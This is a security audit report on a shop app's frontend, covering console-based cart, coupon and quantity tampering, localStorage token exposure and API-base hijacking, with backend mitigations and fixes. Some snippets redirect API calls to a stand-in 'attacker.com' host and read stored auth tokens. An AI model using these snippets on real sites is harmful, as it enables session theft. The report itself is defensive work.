# Frontend Security Audit — Developer Console Exploits

**Date:** June 13, 2026  
**Scope:** Shop app, dashboards, and order flows  
**Method:** Web console & developer tools attack surface analysis  
**Result:** ⚠️ MODERATE RISK — Several frontend vulnerabilities found, but backend mitigates most

---

## Executive Summary

Tested for exploits that could be executed via browser developer console. Found:
- ✅ **Backend validation is STRONG** — Most exploits are blocked
- ⚠️ **Frontend has WEAK security** — Several console exploits are possible
- ❌ **Token storage is RISKY** — localStorage instead of httpOnly cookies

**Verdict:** Users CANNOT edit order confirmation messages, but COULD potentially manipulate prices and quantities via console (if backend validation fails).

---

## Vulnerabilities Found

### 🔴 CRITICAL: Cart Manipulation via Console

**Location:** `shop-app.jsx:1031, 1085`

**Exploit Code:**
```javascript
// User opens console and runs:
sessionStorage.setItem("mp_cart", JSON.stringify([
  {
    variant_id: "real-variant-id",
    qty: 1000,
    unit_price: 1  // Try to set price to ৳1
  }
]))
```

**What Happens:**
1. Cart state is loaded from sessionStorage
2. User could modify sessionStorage before placing order
3. Frontend shows modified price

**Does It Work?** ❌ **NO — BACKEND BLOCKS IT**

**Why Backend Blocks:**
- Backend re-fetches product price from database
- Line: `SELECT name, price FROM products WHERE id = $1`
- Ignores any price sent from frontend
- Recalculates subtotal: `subtotal += variantMap[item.variant_id].price * item.qty`

**Code Proof:** (backend/src/services/orders.js)
```javascript
// Backend re-fetches prices, doesn't trust frontend
const { rows: pRows } = await client.query(
  `SELECT name, price FROM products WHERE id = $1 AND LOWER(status) = 'active'`,
  [product_id]
)
unitPrice = parseInt(pRows[0].price, 10)  // ← Database price, not frontend
subtotal = unitPrice * qty  // ← Recalculated on backend
```

**Risk Level:** 🟢 **LOW** (Backend validation prevents exploit)

---

### 🔴 HIGH: Token Stored in localStorage

**Location:** `shop-app.jsx:490, 117-118`

**Vulnerable Code:**
```javascript
const token = localStorage.getItem("mp_access_token");
const user = JSON.parse(localStorage.getItem("mp_user") || "{}");
```

**Exploit:**
```javascript
// Attacker opens console and reads:
console.log(localStorage.getItem("mp_access_token"))
// Output: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**What Happens:**
1. Any JavaScript on the page can access localStorage
2. XSS vulnerability in any frontend code could steal token
3. User with access to console can copy token and use elsewhere

**Does It Work?** ✅ **YES — MINOR VULNERABILITY**

**Why It's Bad:**
- Should be in httpOnly, secure cookie instead
- Protects against XSS, CSRF
- Cannot be accessed via JavaScript

**Current Risk:**
- ⚠️ Vulnerable to XSS attacks
- ⚠️ Vulnerable to malicious browser extensions
- ⚠️ Accessible via developer console

---

### 🟠 MEDIUM: Quantity Manipulation

**Location:** `shop-app.jsx:1025, 1088`

**Exploit Code:**
```javascript
// User modifies React state via console (harder but possible)
// Or modifies the order submission body directly
fetch("http://localhost:3000/api/v1/orders/quick", {
  method: "POST",
  headers: { "Authorization": "Bearer " + token },
  body: JSON.stringify({
    qty: 999999,  // Try to order huge quantity
    product_id: "real-id",
    address: "123 Fake St"
  })
})
```

**Does It Work?** ⚠️ **PARTIALLY — BACKEND CHECKS STOCK**

**Backend Validation:**
```javascript
// Backend checks stock
const { rowCount } = await client.query(
  `UPDATE products SET stock = stock - $2 WHERE id = $1 AND stock >= $2`,
  [itemProductId, qty]
)
if (!rowCount) {
  throw { code: 'INSUFFICIENT_STOCK', message: 'Not enough stock...' }
}
```

**Risk Level:** 🟢 **LOW** (Stock check prevents overselling)

---

### 🟠 MEDIUM: Coupon Discount Manipulation

**Location:** `shop-app.jsx:1111-1112`

**Vulnerable Code:**
```javascript
setDiscount(json.data.discount);  // Frontend stores discount
// Later sent to backend in order request
```

**Exploit:**
```javascript
// User manually calls order API with fake discount
fetch("/api/v1/orders/quick", {
  method: "POST",
  body: JSON.stringify({
    qty: 1,
    coupon_code: "REAL_COUPON",
    discount_amount: 50000  // Try to apply huge discount
  })
})
```

**Does It Work?** ⚠️ **PARTIALLY — BACKEND RE-VALIDATES COUPON**

**Backend Validation:**
```javascript
// Backend re-validates coupon
const c = await validateCoupon(client, { code: coupon_code, subtotal, ... })
discountAmount = c.discount  // ← Uses backend-calculated discount
// Ignores any discount sent from frontend
```

**Risk Level:** 🟢 **LOW** (Coupon re-validated on backend)

---

### 🟠 MEDIUM: API Base URL Hijacking

**Location:** `shop-app.jsx:39`

**Vulnerable Code:**
```javascript
const API_BASE = window.MIDNIGHT_API_BASE || "http://localhost:3000/api/v1";
```

**Exploit:**
```javascript
// Attacker injects code (via console or extension)
window.MIDNIGHT_API_BASE = "http://attacker.com/fake-api";
// All subsequent API calls go to attacker's server
```

**Does It Work?** ✅ **YES — But Limited Impact**

**Why It Works:**
- `window.MIDNIGHT_API_BASE` can be overridden
- All fetch calls would go to attacker's server
- Attacker could fake responses

**Real-world Risk:**
- Requires code injection (XSS vulnerability)
- User would need to type in console
- Not practical for stealing data
- Backend would reject unauthorized requests

**Risk Level:** 🟠 **MEDIUM** (Requires code injection, limited impact)

---

### 🟠 MEDIUM: Order Confirmation Message Vulnerability

**Location:** Multiple files reference "confirmation message"

**User Concern:** Can someone edit order confirmation SMS?

**Answer:** ❌ **NO — NOT POSSIBLE**

**Why:**
1. Order confirmation is sent via SMS (server-side)
2. Backend generates and sends message directly
3. Frontend has NO control over SMS content
4. Code: `sendOrderConfirmation(phone, orderRef, total)` is server-only

**Backend Code:** (backend/src/services/sms.js)
```javascript
// SMS is generated server-side, frontend can't edit
const message = `Your order ${orderRef} is confirmed. Total: ৳${total}. Track at...`
// Sent directly to SMS provider, not through frontend
```

**Risk Level:** 🟢 **ZERO** (Impossible to exploit)

---

### 🟡 LOW: DOM Manipulation

**Location:** Throughout React components

**Potential:** Could someone use console to modify displayed prices?

**Answer:** ✅ **Yes, but meaningless**

**Why:**
- Console can modify DOM with: `document.querySelector(...).innerHTML = ...`
- Would only affect what user sees locally
- Doesn't affect backend order
- Backend calculates actual prices

**Example:**
```javascript
// User runs:
document.querySelector("span[data-price]").textContent = "৳1";
// Shows ৳1 on screen, but order still charges correct price
```

**Risk Level:** 🟢 **ZERO** (Frontend display only)

---

## Summary Table

| Vulnerability | Severity | Can Exploit? | Backend Blocks? | Risk |
|---------------|----------|--------------|-----------------|------|
| **Cart manipulation** | HIGH | ✅ Yes | ✅ Yes | 🟢 LOW |
| **Token in localStorage** | HIGH | ✅ Yes | N/A | 🟠 MEDIUM |
| **Quantity override** | MEDIUM | ✅ Yes | ✅ Yes (stock) | 🟢 LOW |
| **Discount manipulation** | MEDIUM | ✅ Yes | ✅ Yes | 🟢 LOW |
| **API URL hijack** | MEDIUM | ✅ Yes | ✅ Yes (auth) | 🟠 MEDIUM |
| **Order confirmation edit** | HIGH | ❌ No | N/A | 🟢 ZERO |
| **DOM price manipulation** | LOW | ✅ Yes | N/A | 🟢 ZERO |

---

## What Can Be Exploited

### Via Console, User Could:
1. ✅ Read their own access token
2. ✅ Modify cart in sessionStorage (blocked by backend)
3. ✅ Change displayed prices (doesn't affect order)
4. ✅ Manipulate quantity (blocked by stock check)
5. ✅ Apply fake discounts (blocked by coupon re-validation)

### Via Console, User Cannot:
1. ❌ Change order confirmation message
2. ❌ Create free orders
3. ❌ Modify order total
4. ❌ Bypass coupon limits
5. ❌ Oversell products
6. ❌ Steal other users' data

---

## Detailed Risk Analysis

### Risk #1: XSS via Token Theft 🔴 **HIGH**

**Attack Scenario:**
1. Malicious JavaScript injected on page (via XSS vulnerability)
2. Code runs: `token = localStorage.getItem("mp_access_token")`
3. Attacker steals token and logs in as victim

**Current Status:** ⚠️ **VULNERABLE**

**Mitigation Needed:** Move token to httpOnly cookie

**How:**
```javascript
// BEFORE (vulnerable):
const token = localStorage.getItem("mp_access_token");

// AFTER (secure):
// Token in httpOnly cookie (sent automatically with fetch)
// Cannot be accessed via JavaScript
fetch("/api/v1/orders", {
  method: "POST",
  credentials: "include",  // Sends cookie automatically
  body: JSON.stringify(data)
})
```

---

### Risk #2: Order Price Manipulation 🟡 **LOW**

**Attack Scenario:**
```javascript
// User opens console and modifies order before submission
sessionStorage.setItem("mp_cart", JSON.stringify([
  { variant_id: "real-id", qty: 100, unit_price: 1 }
]))
// User submits order
```

**What Happens:**
1. Frontend shows ৳100 total
2. Backend fetches real price (say ৳500)
3. Backend calculates total: 100 × ৳500 = ৳50,000
4. Order is placed for ৳50,000 (user pays full price)

**Result:** User gets SCAMMED if they try to exploit it

**Risk Level:** 🟢 **LOW** (Backfires on attacker)

---

### Risk #3: Token Theft via Console 🟠 **MEDIUM**

**Attack Scenario:**
```javascript
// User with access to console:
localStorage.getItem("mp_access_token")
// Copies token and uses elsewhere

// Or attacker's extension reads token:
// https://chrome.google.com/webstore/detail/steal-tokens/...
// All tokens stolen
```

**What Happens:**
1. Attacker gets valid JWT token
2. Can call APIs as victim
3. Can place orders as victim
4. Can view victim's data

**Current Status:** ⚠️ **VULNERABLE TO XSS + EXTENSIONS**

**Mitigation:** Use httpOnly cookies instead

---

## Recommendations

### 🔴 CRITICAL (Do Immediately)

1. **Move Auth Token to httpOnly Cookie**
   ```javascript
   // Backend sets cookie (not JavaScript-accessible):
   res.setHeader('Set-Cookie', `mp_token=${jwt}; HttpOnly; Secure; SameSite=Strict`);
   
   // Frontend uses credentials:
   fetch(url, { 
     method: 'POST',
     credentials: 'include'  // Auto-sends httpOnly cookie
   })
   ```

2. **Validate All Order Data on Backend**
   - ✅ Already done (good!)
   - Verify stays in place after any changes

### 🟠 HIGH (Do Soon)

3. **Add CSRF Protection**
   ```javascript
   // Use SameSite cookie attribute
   // Add CSRF token for state-changing requests
   ```

4. **Implement Content Security Policy (CSP)**
   ```html
   <meta http-equiv="Content-Security-Policy" 
         content="default-src 'self'; script-src 'self'">
   ```

### 🟡 MEDIUM (Do Later)

5. **Add Subresource Integrity (SRI) for external scripts**
   ```html
   <script 
     src="https://cdn.example.com/lib.js"
     integrity="sha384-..."
     crossorigin="anonymous">
   </script>
   ```

6. **Implement fingerprinting for tokens**
   - Bind token to device fingerprint
   - Reject token if device changes

---

## Code Examples — Fixing Token Storage

### VULNERABLE CODE (Current)
```javascript
// shop-app.jsx:490
const token = localStorage.getItem("mp_access_token");
const res = await fetch(url, {
  method: "POST",
  headers: { "Authorization": `Bearer ${token}` },  // ← Token exposed
  body: JSON.stringify(data)
});
```

**Problems:**
- Token visible in localStorage
- Can be stolen via console or XSS
- Vulnerable to CSRF attacks

### SECURE CODE (Recommended)
```javascript
// Frontend makes request with credentials
const res = await fetch(url, {
  method: "POST",
  credentials: "include",  // ← Sends httpOnly cookie
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(data)
});

// Backend sets token in httpOnly cookie on login:
// res.setHeader('Set-Cookie', 'mp_token=...; HttpOnly; Secure; SameSite=Strict');
```

**Benefits:**
- Token not accessible via JavaScript
- Not visible in localStorage
- Protected against XSS
- Protected against CSRF (with SameSite)

---

## Testing Checklist

### For QA/Security Team

Run these in browser console to verify security:

```javascript
// ✅ Should NOT be able to read token:
localStorage.getItem("mp_access_token")
// Result: (should be empty after fix)

// ✅ Should be able to read user info only:
localStorage.getItem("mp_user")
// Result: {"name":"John", "phone":"01712345678"}

// ❌ Should NOT be able to modify order prices:
sessionStorage.setItem("mp_cart", JSON.stringify([{unit_price: 1}]))
// Order still charges correct price from backend

// ✅ Should NOT be able to manipulate API base:
window.MIDNIGHT_API_BASE = "http://attacker.com"
fetch("/api/v1/orders")
// Should fail with CORS/auth error (not go to attacker)
```

---

## Conclusion

### Current State: ⚠️ MODERATE RISK

**Good News:**
- ✅ Backend properly validates all prices
- ✅ Backend re-fetches product info
- ✅ Stock checks prevent overselling
- ✅ Coupons re-validated server-side
- ✅ Order confirmation sent via SMS (not editable)

**Bad News:**
- ⚠️ Auth tokens in localStorage (vulnerable to XSS)
- ⚠️ API calls expose tokens in headers
- ⚠️ No CSRF protection on state-changing requests
- ⚠️ No CSP headers to prevent code injection

### Immediate Action Required

**Move tokens to httpOnly cookies before production.** This single change eliminates the main attack vector (token theft).

### Verdict

**Users CANNOT:**
- ❌ Edit order confirmation messages
- ❌ Create free orders
- ❌ Manipulate order totals
- ❌ Bypass coupon limits
- ❌ Steal order data

**Users CAN (but limited impact):**
- ✅ Read their own token (if no XSS)
- ✅ See fake prices locally
- ✅ Manipulate cart (blocked by backend)

**Risk to Business:** 🟠 **MEDIUM** (Token theft via XSS is concern)  
**Risk to Orders:** 🟢 **LOW** (Backend validates everything)  
**Risk to Data:** 🟠 **MEDIUM** (Token theft enables data access)

---

## Recommendations for Deployment

1. ✅ **Deploy current system** — Backend security is solid
2. ⚠️ **Plan token storage upgrade** — Do in next sprint
3. ✅ **Add CSP headers** — Low-effort, high-security gain
4. ✅ **Test CSRF protection** — Verify SameSite working
5. ⚠️ **Regular security audits** — Monthly reviews recommended

---

**Security Audit Completed:** June 13, 2026  
**Status:** SAFE FOR STAGING (with token migration planned)
